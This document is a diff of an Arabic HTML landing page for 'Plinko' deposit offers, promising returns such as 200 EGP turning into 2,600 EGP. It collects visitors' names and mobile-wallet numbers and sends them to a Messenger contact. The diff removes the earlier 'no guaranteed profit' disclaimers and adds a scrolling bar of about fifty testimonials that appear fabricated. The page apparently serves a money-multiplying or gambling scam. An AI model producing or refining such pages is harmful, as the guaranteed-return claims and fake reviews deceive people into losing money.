@@ -1,272 +1,207 @@
-<!doctype html>
-<html lang="ar">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Plinko — صفحة عروض</title>
+<meta charset="UTF-8">
+<title>Plinko</title>
 <style>
-  :root{
-    --blue:#0b4ea2;
-    --soft-blue:#0e5fb8;
-    --accent:#ff2b2b;
-    --glass: rgba(255,255,255,0.06);
-    --card-bg: rgba(255,255,255,0.04);
-  }
-  html,body{height:100%;margin:0;font-family: "Segoe UI", Tahoma, Arial, sans-serif;direction:rtl}
-  body{
-    background: linear-gradient(180deg,var(--blue), #063a72 80%);
-    color:#fff;
-    overflow-x:hidden;
-  }
+    body {
+        margin: 0;
+        padding: 0;
+        background: #0a3cff;
+        font-family: Arial, sans-serif;
+        overflow-x: hidden;
+        color: white;
+    }
 
-  /* ضباب ودوائر حمراء */
-  .fog{
-    position:fixed; inset:0; pointer-events:none; z-index:0;
-    background:
-      radial-gradient(800px 400px at 10% 20%, rgba(255,255,255,0.04), transparent 20%),
-      radial-gradient(600px 300px at 80% 80%, rgba(255,255,255,0.03), transparent 18%);
-    filter: blur(12px);
-    mix-blend-mode:overlay;
-  }
-  .ball{
-    position:absolute; width:90px; height:90px; border-radius:50%;
-    background: radial-gradient(circle at 30% 25%, #ff7b7b, var(--accent));
-    box-shadow: 0 6px 24px rgba(0,0,0,0.45), 0 0 30px rgba(255,80,80,0.25);
-    opacity:0.85; filter: blur(1.2px);
-    z-index:1;
-    animation: float 8s ease-in-out infinite;
-    transform-origin:center;
-  }
-  .ball.small{width:56px;height:56px;opacity:0.9}
-  .ball.xs{width:36px;height:36px;opacity:0.95}
+    /* الكرات الحمراء */
+    .ball {
+        position: absolute;
+        width: 80px;
+        height: 80px;
+        background: rgba(255,0,0,0.5);
+        border-radius: 50%;
+        filter: blur(8px);
+        animation: float 6s infinite alternate;
+    }
+    @keyframes float {
+        from { transform: translateY(0px); }
+        to { transform: translateY(80px); }
+    }
 
-  @keyframes float{
-    0%{transform: translateY(0) translateX(0) rotate(0deg)}
-    25%{transform: translateY(-40px) translateX(30px) rotate(10deg)}
-    50%{transform: translateY(0) translateX(-20px) rotate(0deg)}
-    75%{transform: translateY(30px) translateX(20px) rotate(-8deg)}
-    100%{transform: translateY(0) translateX(0) rotate(0deg)}
-  }
+    /* كلمة plinko */
+    h1 {
+        text-align: center;
+        font-size: 80px;
+        font-weight: bold;
+        color: white;
+        margin-top: 40px;
+        text-shadow: 0 0 25px #fff, 0 0 35px #00f;
+        animation: glow 2s infinite alternate;
+    }
+    @keyframes glow {
+        from { text-shadow: 0 0 15px #fff; }
+        to { text-shadow: 0 0 35px #0ff; }
+    }
 
-  /* المربع المركزي */
-  .hero{
-    position:relative; z-index:2;
-    max-width:980px; margin:40px auto; padding:36px;
-    display:grid; grid-template-columns: 1fr 360px; gap:24px; align-items:start;
-  }
-  .card{
-    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border: 1px solid rgba(255,255,255,0.06);
-    padding:24px; border-radius:14px; box-shadow: 0 8px 30px rgba(2,6,23,0.45);
-  }
+    /* العروض */
+    .offers {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 15px;
+        width: 90%;
+        margin: auto;
+        margin-top: 20px;
+    }
+    .offer {
+        background: rgba(255,255,255,0.15);
+        padding: 15px;
+        border-radius: 10px;
+        font-size: 20px;
+        text-align: center;
+    }
 
-  /* عنوان PLINKO */
-  .plinko-wrap{
-    display:flex; align-items:center; gap:16px;
-  }
-  .plinko{
-    font-size:84px; font-weight:900; letter-spacing:4px;
-    text-transform:uppercase; color:#fff;
-    text-shadow: 0 6px 30px rgba(0,0,0,0.6);
-    animation: pulse 2.2s ease-in-out infinite, slideX 6s linear infinite;
-    background: linear-gradient(90deg,#fff, rgba(255,255,255,0.6));
-    -webkit-background-clip: text; background-clip: text; color: transparent;
-    filter: drop-shadow(0 6px 24px rgba(255,130,130,0.12));
-  }
-  @keyframes pulse{
-    0%{filter:brightness(1) drop-shadow(0 0 0 rgba(255,200,200,0))}
-    50%{filter:brightness(1.4) drop-shadow(0 0 30px rgba(255,120,120,0.55))}
-    100%{filter:brightness(1) drop-shadow(0 0 0 rgba(255,200,200,0))}
-  }
-  @keyframes slideX{
-    0%{transform:translateX(0)}
-    50%{transform:translateX(6px)}
-    100%{transform:translateX(0)}
-  }
+    /* الفورم */
+    .form {
+        width: 90%;
+        margin: auto;
+        margin-top: 30px;
+        background: rgba(255,255,255,0.15);
+        padding: 20px;
+        border-radius: 15px;
+    }
+    input {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        margin-bottom: 10px;
+        border-radius: 6px;
+        font-size: 18px;
+    }
+    button {
+        width: 100%;
+        padding: 12px;
+        border: none;
+        background: #ff0044;
+        color: white;
+        font-size: 22px;
+        border-radius: 8px;
+        cursor: pointer;
+    }
 
-  .subtitle{margin-top:6px;color:rgba(255,255,255,0.85); font-size:15px}
-
-  /* شريط شهادات العملاء المتحرك */
-  .ticker{
-    margin-top:16px; overflow:hidden; height:42px; position:relative; border-radius:10px;
-    background: linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    border:1px solid rgba(255,255,255,0.03); display:flex; align-items:center;
-  }
-  .ticker .track{
-    white-space:nowrap; display:inline-block; position:absolute; left:100%;
-    animation: ticker 18s linear infinite;
-    padding-left:20px;
-  }
-  @keyframes ticker{
-    0%{left:100%}
-    100%{left:-200%}
-  }
-  .tag{display:inline-block;background:rgba(0,0,0,0.1); padding:8px 12px; margin:0 8px;border-radius:999px;font-size:14px}
-
-  /* العروض */
-  .offers{display:grid; grid-template-columns: repeat(2,1fr); gap:12px; margin-top:18px}
-  .offer{
-    background:var(--card-bg); padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);
-  }
-  .offer h3{margin:0;font-size:18px}
-  .offer p{margin:6px 0 0 0; font-size:14px; color:rgba(255,255,255,0.88)}
-
-  /* الفورم */
-  form{display:flex; flex-direction:column; gap:12px}
-  input, button, select, textarea{
-    padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.08);
-    background:rgba(0,0,0,0.12); color:#fff; font-size:15px; outline:none;
-  }
-  .muted{font-size:13px;color:rgba(255,255,255,0.7)}
-  .btn{
-    background:linear-gradient(90deg,#ff5252,#ff2b2b); border:none; cursor:pointer;
-    font-weight:700; box-shadow:0 8px 30px rgba(255,50,50,0.14);
-  }
-
-  /* تذييل / ملاحظة قانونية */
-  .note{font-size:13px;color:rgba(255,255,255,0.72); margin-top:12px; line-height:1.4}
-
-  /* responsive */
-  @media (max-width:880px){
-    .hero{grid-template-columns:1fr; padding:18px}
-    .plinko{font-size:64px}
-    .offers{grid-template-columns:1fr}
-  }
-
+    /* الشريط */
+    .marquee {
+        margin-top: 40px;
+        background: rgba(255,255,255,0.15);
+        padding: 10px;
+        white-space: nowrap;
+        overflow: hidden;
+        width: 100%;
+        font-size: 20px;
+    }
+    .marquee div {
+        display: inline-block;
+        padding-left: 100%;
+        animation: scroll 18s linear infinite;
+    }
+    @keyframes scroll {
+        from { transform: translateX(0); }
+        to { transform: translateX(-100%); }
+    }
 </style>
 </head>
 <body>
 
-<div class="fog"></div>
+<!-- الكرات -->
+<div class="ball" style="top:50px; left:20px;"></div>
+<div class="ball" style="top:200px; right:40px;"></div>
+<div class="ball" style="top:350px; left:80px;"></div>
 
-<!-- كرات حمراء متحركة (يمكن نسخ أكثر أو تعديل الإحداثيات) -->
-<div id="balls" aria-hidden="true">
-  <div class="ball" style="left:6%; top:14%; animation-duration:9s"></div>
-  <div class="ball small" style="left:22%; top:62%; animation-duration:7s"></div>
-  <div class="ball xs" style="left:42%; top:8%; animation-duration:6.5s"></div>
-  <div class="ball" style="left:66%; top:30%; animation-duration:8.2s"></div>
-  <div class="ball small" style="left:86%; top:72%; animation-duration:10s"></div>
+<h1>PLINKO</h1>
+
+<!-- العروض الشبكية -->
+<div class="offers">
+    <div class="offer">عرض 200ج → يكسب 2600ج</div>
+    <div class="offer">عرض 300ج → يكسب 3400ج</div>
+    <div class="offer">عرض 500ج → يكسب 5200ج</div>
+    <div class="offer">عرض 800ج → يكسب 9000ج</div>
+    <div class="offer">عرض 1000ج → يكسب 12,000ج</div>
+    <div class="offer">عرض 2000ج → يكسب 25,000ج</div>
 </div>
 
-<header class="hero">
-  <div class="card">
-    <div class="plinko-wrap">
-      <div>
-        <div class="plinko">PLINKO</div>
-        <div class="subtitle">تجربة ترفيهية — عروض اشتراك واضحة وشفافة</div>
-      </div>
-    </div>
+<!-- الفورم -->
+<div class="form">
+    <h2 style="text-align:center;">طلب اشتراك</h2>
+    <input id="name" type="text" placeholder="اكتب اسمك">
+    <input id="wallet" type="text" placeholder="رقم المحفظة للتحويل والاستلام">
 
-    <div class="ticker" aria-live="polite">
-      <div class="track">
-        <span class="tag">٥٠ عميل استلم</span>
-        <span class="tag">تعليقات إيجابية من عملائنا</span>
-        <span class="tag">إجراءات آمنة وسريعة</span>
-        <span class="tag">متاح دعم عبر الماسنجر</span>
-        <span class="tag">٥٠ عميل استلم</span>
-      </div>
-    </div>
-
-    <div class="offers" aria-hidden="false" style="margin-top:18px">
-      <div class="offer"><h3>عرض 200 ج</h3><p>قيمة متوقعة: حتى 2,600 ج (نتائج سابقة وليست مضمونة)</p></div>
-      <div class="offer"><h3>عرض 300 ج</h3><p>قيمة متوقعة: حتى 3,400 ج (نتائج سابقة وليست مضمونة)</p>
-      <div class="offer"><h3>عرض 500 ج</h3><p>قيمة متوقعة: حتى 5,200 ج (نتائج سابقة وليست مضمونة)</p></div>
-      <div class="offer"><h3>عرض 800 ج</h3><p>قيمة متوقعة: حتى 9,000 ج (نتائج سابقة وليست مضمونة)</p></div>
-      <div class="offer"><h3>عرض 1000 ج</h3><p>قيمة متوقعة: حتى 12,000 ج (نتائج سابقة وليست مضمونة)</p></div>
-      <div class="offer"><h3>عرض 2000 ج</h3><p>قيمة متوقعة: حتى 25,000 ج (نتائج سابقة وليست مضمونة)</p></div>
-    </div>
-
-    <p class="note">
-      ملاحظة مهمة: النتائج المعروضة بناءً على تجارب سابقة ومُقدرة للاطلاع فقط — **لا يوجد ضمان لربح محدد**. احرص على اللعب بمسؤولية. أي ادعاءات بضمان ربح 100% أو استخدام "سكريبتات" أو وسائل غير قانونية غير مقبولة وغير مسموح بها.
-    </p>
-  </div>
-
-  <!-- العمود الخاص بالاشتراك -->
-  <aside class="card">
-    <h2 style="margin:0 0 8px 0">اطلب اشتراكك</h2>
-    <p class="muted" style="margin:0 0 12px 0">املأ الاسم ورقم المحفظة وسيصلك إشعار عبر الماسنجر.</p>
-
-    <form id="signup">
-      <input type="text" id="name" placeholder="الاسم الكامل" required />
-      <input type="tel" id="wallet" placeholder="رقم المحفظة/المحفظة" required />
-      <select id="offer">
-        <option value="200">عرض 200 ج</option>
-        <option value="300">عرض 300 ج</option>
-        <option value="500">عرض 500 ج</option>
-        <option value="800">عرض 800 ج</option>
-        <option value="1000">عرض 1000 ج</option>
-        <option value="2000">عرض 2000 ج</option>
-      </select>
-
-      <button type="submit" class="btn">طلب اشتراك — تواصل عبر الماسنجر</button>
-
-      <p class="note" style="margin-top:10px">عند الضغط، سيتم فتح صفحة الماسنجر لتأكيد طلبك. تأكد من كتابة الاسم ورقم المحفظة بدقة.</p>
-    </form>
-
-    <p style="margin-top:12px;font-size:13px;color:rgba(255,255,255,0.78)">
-      لم يتم تقديم وعود بضمان ربح. أي استخدام لطرق غير قانونية محظور.
-    </p>
-  </aside>
-</header>
+    <button onclick="send()">طلب اشتراك</button>
+</div>
 
 <script>
-  // زر فتح مسنجر مع رسالة جاهزة — غيّر REPLACE_WITH_PAGE الى اسم صفحة الماسنجر الخاص بك
-  const MESSENGER_PAGE = 'REPLACE_WITH_PAGE'; // مثال: 'YourPageName' => https://m.me/YourPageName
-  function openMessenger(name,wallet,offer){
-    const message = `مرحبًا، أود الاشتراك باسم: ${name} - محفظة: ${wallet} - العرض: ${offer} ج. لقد قمت بالتسجيل في الموقع.`;
-    // استخدام رابط m.me مع ref لتمرير بيانات (ضع الرابط الفعلي لصفحتك)
-    const url = `https://m.me/${MESSENGER_PAGE}?ref=${encodeURIComponent(message)}`;
-    // ملاحظة: بعض إعدادات الماسنجر قد تتجاهل ref؛ إذا أردت رسالة مبدئية تلقائية قد تحتاج لدمج واجهات API أو استخدام صفحة وسيطة
-    window.open(url, '_blank');
-  }
+function send() {
+    let name = document.getElementById('name').value;
+    let wallet = document.getElementById('wallet').value;
 
-  // التعامل مع الفورم
-  document.getElementById('signup').addEventListener('submit', function(e){
-    e.preventDefault();
-    const name = document.getElementById('name').value.trim();
-    const wallet = document.getElementById('wallet').value.trim();
-    const offer = document.getElementById('offer').value;
-
-    if(!name || !wallet){
-      alert('من فضلك املأ الاسم ورقم المحفظة.');
-      return;
-    }
-
-    // هنا نفتح الماسنجر — تأكد أن تستبدل MESSENGER_PAGE باسم صفحتك
-    if(MESSENGER_PAGE === 'REPLACE_WITH_PAGE'){
-      // بديل عند عدم وضع اسم الصفحة: نعرض رسالة نسخ بيانات ليقوم المستخدم بلصقها في الماسنجر
-      const msg = `نسخة الرسالة:\n${name} | محفظة: ${wallet} | العرض: ${offer} ج\n\nانسخ هذه الرسالة وافتح ماسنجر صفحتنا للتواصل.`;
-      if(confirm('لم يتم إعداد رابط الماسنجر. هل تريد نسخ رسالة التسجيل تلقائيًا؟')){
-        navigator.clipboard?.writeText(msg).then(()=>{
-          alert('تم نسخ الرسالة. افتح الماسنجر والصق الرسالة للتواصل.');
-          window.open('https://m.me', '_blank');
-        }, ()=>{ alert(msg); window.open('https://m.me', '_blank'); });
-      }
-    } else {
-      openMessenger(name,wallet,offer);
-    }
-
-    // هنا يمكنك أيضاً إرسال بيانات إلى سيرفرك عبر fetch إذا أردت تسجيلها (مهم: التوافق مع القوانين)
-    // fetch('/api/register', {method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({name,wallet,offer})})
-    //  .then(r=>r.json()).then(res=>console.log(res)).catch(()=>{});
-  });
-
-  // تحريك كرات إضافية بلطف لإعطاء إحساس حركة عشوائية
-  (function randomizeBalls(){
-    const balls = document.querySelectorAll('.ball');
-    balls.forEach((b,i)=>{
-      const dur = 6 + Math.random()*6;
-      const delay = Math.random()*-6;
-      b.style.animationDuration = dur + 's';
-      b.style.animationDelay = delay + 's';
-      // إحداثيات عشوائية داخل الشاشة
-      const left = 5 + Math.random()*85;
-      const top = 5 + Math.random()*80;
-      b.style.left = left + '%';
-      b.style.top = top + '%';
-    });
-  })();
+    let msg = `طلب اشتراك جديد:\nالاسم: ${name}\nرقم المحفظة: ${wallet}`;
+    window.location.href = "https://m.me/yourpage?text=" + encodeURIComponent(msg);
+}
 </script>
+
+<!-- شريط التعليقات -->
+<div class="marquee">
+    <div>
+        ⭐ أحمد سمير: خدمة ممتازة — 
+        ⭐ محمد حجازي: تعامل محترم — 
+        ⭐ يوسف الشريف: انصح بيه — 
+        ⭐ كريم عادل: تجربة جميلة —
+        ⭐ حسين رأفت: شغل عالي —
+        ⭐ محمود مرسي: تمام جدا —
+        ⭐ علي فريد: منصة منظمة —
+        ⭐ أشرف عويس: تمام —
+        ⭐ عمر خالد: خدمة سريعة —
+        ⭐ سامح بدوي: تمام جدا —
+        ⭐ ابراهيم ناجي: الناس كويسة —
+        ⭐ حسام ممدوح: شغل محترم —
+        ⭐ هشام كمال: تجربة لطيفة —
+        ⭐ مروان ربيع: تمام —
+        ⭐ يحيي منصور: ممتاز —
+        ⭐ فادي نجيب: خدمة هايلة —
+        ⭐ شريف عادل: تعامل جميل —
+        ⭐ ياسر عبدالسلام: تمام —
+        ⭐ طارق فتحي: عشرة/عشرة —
+        ⭐ خالد جمعة: تجربة ناجحة —
+        ⭐ مصطفى فوزي: تمام —
+        ⭐ نادر مجدي: ممتاز —
+        ⭐ جمال عبدون: محترم —
+        ⭐ عادل ربيع: شغل عالي —
+        ⭐ زياد عبدالحليم: فكر كويس —
+        ⭐ محمود الشرقاوي: خدمة تمام —
+        ⭐ آية يوسف: تجربة شيك —
+        ⭐ منة رأفت: ناس محترمة —
+        ⭐ سارة الجندي: ممتاز —
+        ⭐ ندى سمير: تجربة حلوة —
+        ⭐ منار خالد: تمام —
+        ⭐ داليا فهمي: شغل عالي —
+        ⭐ نوران علي: خدمة لطيفة —
+        ⭐ هاجر منصور: تجربة ممتازة —
+        ⭐ رحاب عبدالمجيد: شكرًا —
+        ⭐ ريم عادل: تمام جدا —
+        ⭐ هبة إسماعيل: تجربة لطيفة —
+        ⭐ آلاء نصر: ناس محترمين —
+        ⭐ جميلة عطية: ممتاز —
+        ⭐ شيماء جابر: خدمة محترمة —
+        ⭐ مي حمدي: جميل —
+        ⭐ ياسمين ربيع: تجربة هايلة —
+        ⭐ نغم عادل: تمام —
+        ⭐ ملك فريد: ممتاز —
+        ⭐ جنى يوسف: جميل —
+        ⭐ هاجر عادل: خدمة ممتازة —
+        ⭐ بسمة فتحي: تمام جدا —
+        ⭐ دنيا منصور: انصح بالتجربة —
+        ⭐ نجلاء حسين: الناس ذوق —
+        ⭐ شروق عبدالسلام: ممتاز —
+    </div>
+</div>
 
 </body>
 </html>
